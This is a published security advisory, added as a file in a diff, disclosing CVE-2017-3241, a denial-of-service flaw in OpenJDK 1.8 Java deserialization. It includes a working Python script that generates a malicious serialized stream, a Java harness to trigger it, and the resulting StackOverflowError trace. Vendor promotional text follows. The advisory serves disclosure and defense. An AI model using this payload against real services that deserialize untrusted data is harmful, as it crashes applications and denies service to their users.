@@ -1,0 +1,311 @@
+'''
+Application: Java SE
+
+Vendor: Oracle
+
+Bug: DoS
+
+Reported: 23.12.2016
+
+Vendor response: 24.12.2016
+
+Date of Public Advisory: 17.01.2017
+
+Reference: Oracle CPU Jan 2017
+
+Author: Roman Shalymov
+
+
+
+1. ADVISORY INFORMATION
+
+Title: Oracle OpenJDK - Java Serialization DoS
+
+Advisory ID: [ERPSCAN-17-006]
+
+Risk: High
+
+Advisory URL:
+https://erpscan.com/advisories/erpscan-17-006-oracle-openjdk-java-serialization-dos-vulnerability/
+
+Date published: 17.01.2017
+
+Vendor contacted: Oracle
+
+
+2. VULNERABILITY INFORMATION
+
+
+Class: Denial of Service
+
+Remotely Exploitable: Yes
+
+Locally Exploitable: Yes
+
+CVE Name: CVE-2017-3241
+
+CVSS Base Score: 9.0
+
+
+3. VULNERABILITY DESCRIPTION
+
+
+An attacker can cause DoS of the application which uses OpenJDK Runtime
+Environment 1.8 as its core runtime engine.
+
+
+4. VULNERABLE PACKAGES
+
+
+OpenJDK Runtime Environment build 1.8.0_112-b15
+
+
+5. SOLUTIONS AND WORKAROUNDS
+
+
+Fix ObjectInputStream.skipCustomData() method, namely readObject0(false);
+call in switch statement
+
+Adress Oracle CPU January 2017
+
+ 6. AUTHOR
+
+
+Roman Shalymov (@shalymov)
+
+
+7. TECHNICAL DESCRIPTION
+
+
+An attacker can craft a malicious sequence of bytes that will cause JVM
+StackOverflowError in the standard Java deserialization process if it uses
+ObjectInputStream.readObject() method.
+
+
+7.1. Proof of Concept
+
+An attacker creates a malicious sequence of bytes, for example, using this
+python script pwn_ser.py:
+
+'''
+#!/usr/bin/env python2
+
+import sys
+
+exp = ""
+
+#serialization header
+
+exp += '\xac\xed\x00\x05'
+
+exp1 = ''
+
+exp1 += '\x72'
+
+exp1 += '\x00\x0c'+'java.io.File'
+
+exp1 += '\x41'*8
+
+exp1 += '\x00'
+
+exp1 += '\x00\x00'
+
+
+exp += exp1 * 10000
+
+sys.stdout.write(exp)
+
+'''
+and save it in exp2.ser file
+
+
+$ ./pwn_ser2.py > exp2.ser
+
+Let's simulate deserialization process. For this purpose, we create a
+simple Java program, which uses the following standard deserialization
+pattern:
+
+
+Serialize_read.java
+
+
+import java.io.FileInputStream;
+
+import java.io.ObjectInputStream;
+
+public class Serialize_read {
+
+public static void main(String args[]) throws Exception {
+
+  if(args.length < 1) {
+
+      System.out.println("usage: "+Serialize_read.class.getSimpleName()+"
+[file]");
+
+      System.exit(-1);
+
+  }
+
+  FileInputStream fin = new FileInputStream(args[0]);
+
+  ObjectInputStream oin = new ObjectInputStream(fin);
+
+  try {
+
+    Object objFromDisk = oin.readObject();
+
+    String s = (String)objFromDisk;
+
+    System.out.println(s);
+
+    System.out.println("Successfully read!");
+
+  }catch(Exception e){}
+
+  System.exit(0);
+
+}
+
+}
+
+
+Let's try to read our malicious file (we can also simulate this stuff over
+network communication):
+
+$ javac Serialize_read.java
+
+$ java Serialize_read exp2.ser
+
+It causes the following error dump:
+
+Exception in thread "main" java.lang.StackOverflowError
+
+at
+java.io.ObjectInputStream$PeekInputStream.readFully(ObjectInputStream.java:2351)
+
+at
+java.io.ObjectInputStream$BlockDataInputStream.readUnsignedShort(ObjectInputStream.java:2834)
+
+at
+java.io.ObjectInputStream$BlockDataInputStream.readUTF(ObjectInputStream.java:2892)
+
+at java.io.ObjectInputStream.readUTF(ObjectInputStream.java:1075)
+
+at java.io.ObjectStreamClass.readNonProxy(ObjectStreamClass.java:684)
+
+at java.io.ObjectInputStream.readClassDescriptor(ObjectInputStream.java:833)
+
+at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1609)
+
+at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)
+
+at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1340)
+
+at java.io.ObjectInputStream.skipCustomData(ObjectInputStream.java:1984)
+
+at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1628)
+
+at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)
+
+at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1340)
+
+...
+
+at java.io.ObjectInputStream.skipCustomData(ObjectInputStream.java:1984)
+
+at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1628)
+
+at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)
+
+at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1340)
+
+at java.io.ObjectInputStream.skipCustomData(ObjectInputStream.java:1984)
+
+at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1628)
+
+at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)
+
+at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1340)
+
+at java.io.ObjectInputStream.skipCustomData(ObjectInputStream.java:1984)
+
+at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1628)
+
+at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1521)
+
+
+8. REPORT TIMELINE
+
+Reported: 23.12.2016
+
+Vendor response: 24.12.2016
+
+Date of Public Advisory: 17.01.2017
+
+9. REFERENCES
+http://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html
+https://erpscan.com/advisories/erpscan-17-006-oracle-openjdk-java-serialization-dos-vulnerability/
+
+
+10. ABOUT ERPScan Research
+
+ERPScan research team specializes in vulnerability research and analysis of
+critical enterprise applications. It was acknowledged multiple times by the
+largest software vendors like SAP, Oracle, Microsoft, IBM, VMware, HP for
+discovering more than 400 vulnerabilities in their solutions (200 of them
+just in SAP!).
+
+ERPScan researchers are proud of discovering new types of vulnerabilities
+(TOP 10 Web Hacking Techniques 2012) and of the "The Best Server-Side Bug"
+nomination at BlackHat 2013.
+
+ERPScan experts participated as speakers, presenters, and trainers at 60+
+prime international security conferences in 25+ countries across the
+continents ( e.g. BlackHat, RSA, HITB) and conducted private trainings for
+several Fortune 2000 companies.
+
+ERPScan researchers carry out the EAS-SEC project that is focused on
+enterprise application security awareness by issuing annual SAP security
+researches.
+
+ERPScan experts were interviewed in specialized info-sec resources and
+featured in major media worldwide. Among them there are Reuters, Yahoo, SC
+Magazine, The Register, CIO, PC World, DarkReading, Heise, Chinabyte, etc.
+
+Our team consists of highly-qualified researchers, specialized in various
+fields of cybersecurity (from web application to ICS/SCADA systems),
+gathering their experience to conduct the best SAP security research.
+
+11. ABOUT ERPScan
+
+ERPScan is the most respected and credible Business Application
+Cybersecurity provider. Founded in 2010, the company operates globally and
+enables large Oil and Gas, Financial, Retail and other organizations to
+secure their mission-critical processes. Named as an aEmerging Vendora in
+Security by CRN, listed among aTOP 100 SAP Solution providersa and
+distinguished by 30+ other awards, ERPScan is the leading SAP SE partner in
+discovering and resolving security vulnerabilities. ERPScan consultants
+work with SAP SE in Walldorf to assist in improving the security of their
+latest solutions.
+
+ERPScanas primary mission is to close the gap between technical and
+business security, and provide solutions for CISO's to evaluate and secure
+SAP and Oracle ERP systems and business-critical applications from both
+cyberattacks and internal fraud. As a rule, our clients are large
+enterprises, Fortune 2000 companies and MSPs, whose requirements are to
+actively monitor and manage security of vast SAP and Oracle landscapes on a
+global scale.
+
+We afollow the suna and have two hubs, located in Palo Alto and Amsterdam,
+to provide threat intelligence services, continuous support and to operate
+local offices and partner network spanning 20+ countries around the globe.
+
+
+Adress USA: 228 Hamilton Avenue, Fl. 3, Palo Alto, CA. 94301
+
+Phone: 650.798.5255
+
+Twitter: @erpscan
+
+Scoop-it: Business Application Security
+'''
